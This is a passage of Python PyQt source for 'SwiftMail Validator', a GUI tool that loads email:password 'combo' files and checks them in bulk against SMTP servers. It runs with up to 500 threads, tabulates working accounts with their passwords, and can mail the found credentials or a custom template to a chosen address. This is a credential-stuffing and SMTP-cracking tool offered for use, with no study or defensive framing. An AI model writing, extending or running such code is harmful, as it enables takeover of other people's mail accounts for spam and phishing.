        """Distribute work among workers"""
        chunk_size = len(combos) // num_workers if num_workers > 0 else len(combos)
        
        worker_generators = []
        if num_workers == 0:
            return []

        for i in range(num_workers):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < num_workers - 1 else len(combos)
            worker_combos = combos[start_idx:end_idx]
            worker_generators.append(iter(worker_combos))
        
        return worker_generators
    
    def _handle_valid_smtp(self, smtp_info, limit, stats_dict):
        """Handle valid SMTP found"""
        self.valid_smtps.add(smtp_info)
        self.signals.valid_smtp.emit(smtp_info, limit, stats_dict)
        
        # Write to file asynchronously
        parts = smtp_info.split('|')
        if len(parts) >= 4:
            file_info = "|".join(parts[:4])  # Only basic info for file
            self.result_writer.write_async(file_info)
    
    def _emit_stats(self):
        """Emit current statistics"""
        stats = self.stats.get_stats()
        self.signals.stats_update.emit(stats)
    
    def update_progress(self, value):
        """Update progress"""
        self.processed_combos += value
        if self.total_combos > 0:
            progress = int((self.processed_combos / self.total_combos) * 100)
            self.signals.progress.emit(progress)
    
    def check_finished(self):
        """Check if all workers have finished"""
        active_workers = sum(1 for worker in self.workers if worker.isRunning())
        
        if active_workers == 0:
            self.stats_timer.stop()
            elapsed = time.time() - self.start_time if self.start_time else 0
            avg_speed = self.processed_combos / elapsed if elapsed > 0 else 0
            
            self.signals.log.emit(
                f"🎉 ULTRA-FAST SCAN COMPLETE! "
                f"⏱️ {elapsed:.1f}s | ⚡ {avg_speed:.1f}/s | "
                f"✅ {len(self.valid_smtps)} valid SMTP servers"
            )
            
            # Stop result writer
            self.result_writer.stop()
            
            self.signals.finished.emit()
    
    def stop(self):
        """Stop all workers"""
        self.signals.log.emit("🛑 Emergency stop initiated...")
        
        # Stop stats timer
        if hasattr(self, 'stats_timer'):
            self.stats_timer.stop()
        
        # Stop all workers
        for worker in self.workers:
            worker.stop()
        
        # Stop result writer
        self.result_writer.stop()
        
        # Force cleanup
        time.sleep(0.5)
        for worker in self.workers:
            if worker.isRunning():
                worker.quit()
                worker.wait(100)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ SwiftMail Validator v2.0 - Professional Edition")
        self.setMinimumSize(1200, 900)
        
        # Initialize components
        self.checker = None
        self.template_data = None
        
        self.init_ui()
        self.load_existing_valid()
        
        # Apply modern styling
        self.setStyleSheet("""
            QMainWindow {
                background: #f8f9fa;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #bdc3c7;
                border-radius: 8px;
                margin: 5px;
                padding: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 10px 0 10px;
            }
            QPushButton {
                border-radius: 6px;
                padding: 8px 15px;
                font-weight: bold;
                border: none;
            }
            QPushButton:hover {
                opacity: 0.8;
            }
            QLineEdit, QSpinBox, QComboBox {
                border: 2px solid #bdc3c7;
                border-radius: 4px;
                padding: 5px;
                background: white;
            }
            QLineEdit:focus, QSpinBox:focus, QComboBox:focus {
                border-color: #3498db;
            }
        """)
    
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main splitter
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        central_widget.layout = QHBoxLayout(central_widget)
        central_widget.layout.addWidget(main_splitter)
        
        # Left panel (controls)
        left_panel = self.create_left_panel()
        main_splitter.addWidget(left_panel)
        
        # Right panel (results and stats)
        right_panel = self.create_right_panel()
        main_splitter.addWidget(right_panel)
        
        # Set splitter proportions
        main_splitter.setSizes([400, 800])
    
    def create_left_panel(self):
        """Create the left control panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Header
        header = QLabel("⚡ SwiftMail Validator v2.0")
        header.setStyleSheet("""
            font-size: 18px; 
            font-weight: bold; 
            color: #2c3e50; 
            padding: 15px;
            background: linear-gradient(90deg, #3498db, #2980b9);
            color: white;
            border-radius: 8px;
            margin-bottom: 10px;
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # Configuration group
        config_group = QGroupBox("⚙️ Configuration")
        config_layout = QVBoxLayout(config_group)
        
        # Test email
        test_email_layout = QHBoxLayout()
        test_email_layout.addWidget(QLabel("Test Email:"))
        self.test_email_input = QLineEdit()
        self.test_email_input.setPlaceholderText("your_email@example.com")
        test_email_layout.addWidget(self.test_email_input)
        config_layout.addLayout(test_email_layout)
        
        # Thread count
        thread_layout = QHBoxLayout()
        thread_layout.addWidget(QLabel("Max Threads:"))
        self.thread_input = QSpinBox()
        self.thread_input.setRange(1, 500)
        self.thread_input.setValue(200)
        self.thread_input.setSuffix(" workers")
        thread_layout.addWidget(self.thread_input)
        config_layout.addLayout(thread_layout)
        
        # File selection
        file_layout = QVBoxLayout()
        file_layout.addWidget(QLabel("Combo File:"))
        file_select_layout = QHBoxLayout()
        self.file_path_input = QLineEdit()
        self.file_path_input.setReadOnly(True)
        self.file_path_input.setPlaceholderText("Select combo file (email:password)")
        browse_button = QPushButton("📁 Browse")
        browse_button.clicked.connect(self.browse_file)
        browse_button.setStyleSheet("background: #95a5a6; color: white;")
        file_select_layout.addWidget(self.file_path_input)
        file_select_layout.addWidget(browse_button)
        file_layout.addLayout(file_select_layout)
        config_layout.addLayout(file_layout)
        
        layout.addWidget(config_group)
        
        # Email mode group
        email_group = QGroupBox("📧 Email Mode")
        email_layout = QVBoxLayout(email_group)
        
        self.email_mode_group = QButtonGroup()
        self.credentials_radio = QRadioButton("🔑 Send SMTP Credentials")
        self.template_radio = QRadioButton("✉️ Use Custom Template")
        self.credentials_radio.setChecked(True)
        
        self.email_mode_group.addButton(self.credentials_radio)
        self.email_mode_group.addButton(self.template_radio)
        
        email_layout.addWidget(self.credentials_radio)
        email_layout.addWidget(self.template_radio)
        
        # Template button
        self.template_button = QPushButton("📝 Create/Edit Template")
        self.template_button.clicked.connect(self.open_template_editor)
        self.template_button.setStyleSheet("background: #9b59b6; color: white;")
        email_layout.addWidget(self.template_button)
        
        layout.addWidget(email_group)
        
        # Control buttons
        button_group = QGroupBox("🎮 Controls")
        button_layout = QVBoxLayout(button_group)
        
        self.start_button = QPushButton("🚀 Start Ultra-Fast Scan")
        self.start_button.clicked.connect(self.start_checking)
        self.start_button.setStyleSheet("background: #27ae60; color: white; font-size: 14px; padding: 12px;")
        
        self.stop_button = QPushButton("⏹ Emergency Stop")
        self.stop_button.clicked.connect(self.stop_checking)
        self.stop_button.setEnabled(False)
        self.stop_button.setStyleSheet("background: #e74c3c; color: white; font-size: 14px; padding: 12px;")
        
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        
        layout.addWidget(button_group)
        
        # Progress
        progress_group = QGroupBox("📊 Progress")
        progress_layout = QVBoxLayout(progress_group)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #bdc3c7;
                border-radius: 8px;
                text-align: center;
                background: white;
            }
            QProgressBar::chunk {
                background: linear-gradient(90deg, #3498db, #2980b9);
                border-radius: 6px;
            }
        """)
        progress_layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("🔄 Ready for ultra-fast scanning")
        self.status_label.setStyleSheet("font-weight: bold; color: #2c3e50; padding: 5px;")
        progress_layout.addWidget(self.status_label)
        
        layout.addWidget(progress_group)
        
        # Log group
        log_group = QGroupBox("📋 System Log")
        log_layout = QVBoxLayout(log_group)
        
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.log_display.setMaximumHeight(150)
        self.log_display.setStyleSheet("""
            background: #2c3e50; 
            color: #ecf0f1; 
            font-family: 'Courier New', monospace;
            font-size: 10px;
            border: none;
            border-radius: 4px;
        """)
        log_layout.addWidget(self.log_display)
        
        layout.addWidget(log_group)
        
        layout.addStretch()
        return panel
    
    def create_right_panel(self):
        """Create the right results panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Stats widget
        self.stats_widget = StatsWidget()
        layout.addWidget(self.stats_widget)
        
        # Results section
        results_splitter = QSplitter(Qt.Orientation.Vertical)
        
        # Filter widget
        self.filter_widget = None  # Will be created after table
        
        # Results table
        table_container = QWidget()
        table_layout = QVBoxLayout(table_container)
        
        table_header = QLabel("✅ Valid SMTP Servers Found")
        table_header.setStyleSheet("font-size: 14px; font-weight: bold; color: #2c3e50; padding: 5px;")
        table_layout.addWidget(table_header)
        
        sort_help = QLabel("💡 Click column headers for advanced sorting • Right-click rows for options")
        sort_help.setStyleSheet("font-size: 10px; color: #7f8c8d; font-style: italic;")
        table_layout.addWidget(sort_help)
        
        self.valid_table = SortableTableWidget(0, 7)  # Added Provider column
        self.valid_table.setHorizontalHeaderLabels([
            "Host", "Port", "Email", "Password", "Limit", "Type", "Provider"
        ])
        self.valid_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        # Add context menu to table
        self.valid_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.valid_table.customContextMenuRequested.connect(self.show_table_context_menu)
        
        table_layout.addWidget(self.valid_table)
        
        # Create filter widget after table
        self.filter_widget = FilterWidget(self.valid_table)
        
        results_splitter.addWidget(self.filter_widget)
        results_splitter.addWidget(table_container)
        results_splitter.setSizes([100, 400])
        
        layout.addWidget(results_splitter)
        
        return panel
    
    def show_table_context_menu(self, position):
        """Show context menu for table"""
        item = self.valid_table.itemAt(position)
        if item is None:
            return
        
        row = item.row()
        menu = QMenu(self)
        
        # Copy actions
        copy_row_action = menu.addAction("📋 Copy Row")
        copy_email_action = menu.addAction("📧 Copy Email")
        copy_password_action = menu.addAction("🔑 Copy Password")
        copy_smtp_action = menu.addAction("🔧 Copy SMTP Config")
        
        menu.addSeparator()
        
        # Export actions
        export_row_action = menu.addAction("💾 Export Row")
        
        action = menu.exec(self.valid_table.mapToGlobal(position))
        
        if action == copy_row_action:
            self.copy_table_row(row)
        elif action == copy_email_action:
            self.copy_table_cell(row, 2)  # Email column
        elif action == copy_password_action:
            self.copy_table_cell(row, 3)  # Password column
        elif action == copy_smtp_action:
            self.copy_smtp_config(row)
        elif action == export_row_action:
            self.export_table_row(row)
    
    def copy_table_row(self, row):
        """Copy entire table row to clipboard"""
        row_data = []
        for col in range(self.valid_table.columnCount()):
            item = self.valid_table.item(row, col)
            row_data.append(item.text() if item else "")
        
        QApplication.clipboard().setText(" | ".join(row_data))
        self.log("📋 Row copied to clipboard")
    
    def copy_table_cell(self, row, col):
        """Copy specific table cell to clipboard"""
        item = self.valid_table.item(row, col)
        if item:
            QApplication.clipboard().setText(item.text())
            self.log(f"📋 {self.valid_table.horizontalHeaderItem(col).text()} copied to clipboard")
    
    def copy_smtp_config(self, row):
        """Copy SMTP configuration to clipboard"""
        host = self.valid_table.item(row, 0).text()
        port = self.valid_table.item(row, 1).text()
        email = self.valid_table.item(row, 2).text()
        password = self.valid_table.item(row, 3).text()
        
        config = f"Host: {host}\nPort: {port}\nEmail: {email}\nPassword: {password}"
        QApplication.clipboard().setText(config)
        self.log("🔧 SMTP configuration copied to clipboard")
    
    def export_table_row(self, row):
        """Export table row to file"""
        row_data = []
        for col in range(self.valid_table.columnCount()):
            item = self.valid_table.item(row, col)
            row_data.append(item.text() if item else "")
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export Row", "", "Text Files (*.txt);;CSV Files (*.csv);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    if file_path.endswith('.csv'):
                        f.write(",".join([f'"{cell}"' for cell in row_data]))
                    else:
                        f.write(" | ".join(row_data))
                self.log(f"💾 Row exported to {file_path}")
            except Exception as e:
                QMessageBox.warning(self, "Export Error", f"Failed to export: {str(e)}")
    
    def browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Combo File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.file_path_input.setText(file_path)
            # Show file info
            try:
                file_size = os.path.getsize(file_path) / 1024 / 1024
                self.log(f"📁 Selected file: {file_size:.1f}MB")
            except:
                pass
    
    def open_template_editor(self):
        """Open the advanced email template editor"""
        dialog = EmailTemplateDialog(self)
        dialog.resize(900, 700)  # Larger size for better editing
        
        if dialog.exec() == QDialog.DialogCode.Accepted:
            self.template_data = dialog.get_template_data()
            self.template_radio.setChecked(True)
            
            # Update template button text
            self.template_button.setText("✅ Template Configured")
            self.template_button.setStyleSheet("background: #27ae60; color: white;")
            
            self.log("✉️ Advanced email template configured successfully")
            
            # Show template summary
            mode = self.template_data.get('mode', 'both')
            subject = self.template_data.get('subject', 'No subject')
            self.log(f"📋 Template mode: {mode.title()}, Subject: '{subject}'")
        else:
            self.log("❌ Template configuration cancelled")
    
    def start_checking(self):
        """Start the ultra-fast SMTP checking process"""
        # Validation
        test_email = self.test_email_input.text().strip()
        if not test_email or '@' not in test_email:
            QMessageBox.warning(self, "Invalid Email", "Please enter a valid test email address")
            return
        
        file_path = self.file_path_input.text()
        if not file_path or not os.path.exists(file_path):
            QMessageBox.warning(self, "File Not Found", "Please select a valid combo file")
            return
        
        max_threads = self.thread_input.value()
        
        # Determine email mode
        email_mode = "template" if self.template_radio.isChecked() else "credentials"
        template_data = self.template_data if email_mode == "template" else None
        
        if email_mode == "template" and not template_data:
            QMessageBox.warning(self, "No Template", "Please create a template first or switch to credentials mode")
            return
        
        # Update UI
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)
        self.status_label.setText("🔄 Initializing ultra-fast scanner...")
        
        # Clear previous results if desired
        reply = QMessageBox.question(
            self, "Clear Results", 
            "Clear previous results before starting?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.valid_table.setRowCount(0)
            self.filter_widget.original_data = []
        
        # Initialize ultra-fast checker
        self.checker = UltraFastSMTPChecker(test_email, max_threads, email_mode, template_data)
        self.checker.signals.log.connect(self.log)
        self.checker.signals.progress.connect(self.update_progress)
        self.checker.signals.valid_smtp.connect(self.add_valid_smtp)
        self.checker.signals.finished.connect(self.checking_finished)
        self.checker.signals.stats_update.connect(self.stats_widget.update_stats)
        
        try:
            # Load combos
            self.log("📂 Loading combo file with advanced optimizations...")
            combo_generator = self.checker.load_combos(file_path)
            
            # Consume generator to get all combos and the correct total count
            combos = list(combo_generator)
            self.checker.total_combos = self.checker.file_handler.valid_combos
            
            self.log(f"🎯 Target: {self.checker.total_combos} valid combos")
            self.log(f"⚡ Mode: {email_mode.title()}")
            self.log(f"🧵 Threads: {max_threads}")
            
            # Start checking
            self.checker.start(combos)
            
        except Exception as e:
            self.log(f"❌ Error starting checker: {str(e)}")
            self.checking_finished()
    
    def stop_checking(self):
        """Stop the checking process"""
        if self.checker:
            self.log("🛑 Initiating emergency stop...")
            self.stop_button.setEnabled(False)
            self.stop_button.setText("⏹ Stopping...")
            
            try:
                self.checker.stop()
            except Exception as e:
                self.log(f"❌ Error during stop: {str(e)}")
            
            self.checking_finished()
    
    def log(self, message):
        """Add message to log with timestamp"""
        timestamp = time.strftime('%H:%M:%S')
        formatted_message = f"[{timestamp}] {message}"
        self.log_display.append(formatted_message)
        
        # Auto-scroll to bottom
        scrollbar = self.log_display.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
        
        # Limit log size to prevent memory issues
        if self.log_display.document().blockCount() > 1000:
            cursor = self.log_display.textCursor()
            cursor.movePosition(cursor.MoveOperation.Start)
            cursor.movePosition(cursor.MoveOperation.Down, cursor.MoveMode.KeepAnchor, 100)
            cursor.removeSelectedText()
    
    def update_progress(self, value):
        """Update progress bar and status"""
        self.progress_bar.setValue(value)
        
        valid_count = self.valid_table.rowCount()
        if hasattr(self, 'checker') and self.checker:
            processed = self.checker.processed_combos
            total = self.checker.total_combos
            self.status_label.setText(f"⚡ Progress: {value}% ({processed}/{total}) | Valid: {valid_count}")
    
    def add_valid_smtp(self, smtp_info, limit, stats_dict):
        """Add valid SMTP to table with enhanced information (all limits, rate prioritized)"""
        parts = smtp_info.split('|')
        if len(parts) >= 6:
            row = self.valid_table.rowCount()
            self.valid_table.insertRow(row)

            # Use all limits (comma-separated)
            all_limits = limit
            first_limit = all_limits.split(',')[0].strip() if all_limits and ',' in all_limits else all_limits
            # Determine type from first limit
            if any(x in first_limit.lower() for x in ["/hour", "/day", "/min"]):
                limit_type_text = "⚡ Rate Limit"
                row_color = QColor(144, 238, 144)  # Light green
            elif any(x in first_limit.lower() for x in ["mb", "kb", "b"]):
                limit_type_text = "📦 Size Limit"
                row_color = QColor(255, 255, 224)  # Light yellow
            else:
                limit_type_text = "❓ Unknown"
                row_color = QColor(211, 211, 211)  # Light gray

            # Set items with colors
            items_data = [
                parts[0],  # Host
                parts[1],  # Port
                parts[2],  # Email
                parts[3],  # Password
                all_limits,     # All limits (rate prioritized)
                limit_type_text,  # Type
                parts[5] if len(parts) > 5 else "Unknown"   # Provider
            ]

            for col, text in enumerate(items_data):
                item = QTableWidgetItem(text)
                item.setBackground(row_color)
                # Add tooltips for better UX
                if col == 0:  # Host
                    item.setToolTip(f"SMTP Host: {text}")
                elif col == 1:  # Port
                    secure = "🔒 Secure" if text in ['465', '587'] else "⚠️ Unencrypted"
                    item.setToolTip(f"Port {text} ({secure})")
                elif col == 4:  # Limit
                    item.setToolTip(f"Server Limits: {text}")
                elif col == 6:  # Provider
                    item.setToolTip(f"Email Provider: {text}")
                self.valid_table.setItem(row, col, item)

            # Always update filter widget's original_data after adding a row
            if self.filter_widget:
                self.filter_widget.save_original_data()
    
    def checking_finished(self):
        """Handle checking completion"""
        self.log("🎉 Ultra-fast scanning completed!")
        
        # Update UI
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.stop_button.setText("⏹ Emergency Stop")
        
        # Reset template button if needed
        if hasattr(self, 'template_button'):
            if self.template_data:
                self.template_button.setText("✅ Template Configured")
                self.template_button.setStyleSheet("background: #27ae60; color: white;")
            else:
                self.template_button.setText("📝 Create/Edit Template")
                self.template_button.setStyleSheet("background: #9b59b6; color: white;")
        
        valid_count = self.valid_table.rowCount()
        self.status_label.setText(f"✅ Scan Complete - Found {valid_count} valid SMTP servers")
        
        # Show completion notification
        if valid_count > 0:
            QMessageBox.information(
                self, "Scan Complete", 
                f"🎉 Ultra-fast scan completed successfully!\n\n"
                f"✅ Found {valid_count} valid SMTP servers\n"
                f"📁 Results saved to validsend.txt\n\n"
                f"Use the filters and sorting options to analyze your results."
            )
    
    def load_existing_valid(self):
        """Load existing valid SMTP servers"""
        if os.path.exists('validsend.txt'):
            try:
                count = 0
                with open('validsend.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if '|' in line:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                # Add defaults for missing info
                                while len(parts) < 7:
                                    if len(parts) == 4:
                                        parts.append("Unknown")  # Limit
                                    elif len(parts) == 5:
                                        parts.append("❓ Unknown")  # Type
                                    elif len(parts) == 6:
                                        parts.append("Other")  # Provider
                                
                                smtp_info = "|".join(parts)
                                self.add_valid_smtp(smtp_info, parts[4], {})
                                count += 1
                
                if count > 0:
                    self.log(f"📋 Loaded {count} existing valid SMTP servers")
            except Exception as e:
                self.log(f"⚠️ Error loading existing results: {str(e)}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("SwiftMail Validator")
    app.setApplicationVersion("2.0")
    app.setOrganizationName("SMTP Tools")
    
    # Apply modern style
    app.setStyle('Fusion')
    
    window = MainWindow()
    window.show()
    
    sys.exit(app.exec())
